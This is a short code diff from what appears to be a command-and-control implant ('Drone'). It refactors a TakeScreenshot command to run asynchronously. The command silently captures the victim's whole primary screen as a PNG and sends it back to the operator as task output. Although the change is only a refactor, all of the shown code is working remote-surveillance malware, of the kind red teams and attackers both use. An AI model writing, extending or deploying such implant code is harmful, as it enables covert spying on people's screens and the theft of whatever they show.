@@ -2,6 +2,7 @@
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Drone.Commands;
 
@@ -10,7 +11,7 @@ public sealed class TakeScreenshot : DroneCommand
     public override byte Command => 0x1C;
     public override bool Threaded => false;
 
-    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         var size = new Size(
             (int)System.Windows.SystemParameters.PrimaryScreenWidth,
@@ -23,6 +24,6 @@ public sealed class TakeScreenshot : DroneCommand
         graphic.CopyFromScreen(Point.Empty, Point.Empty, size);
         bitmap.Save(ms, ImageFormat.Png);
 
-        Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, ms.ToArray()));
+        await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, ms.ToArray()));
     }
 }
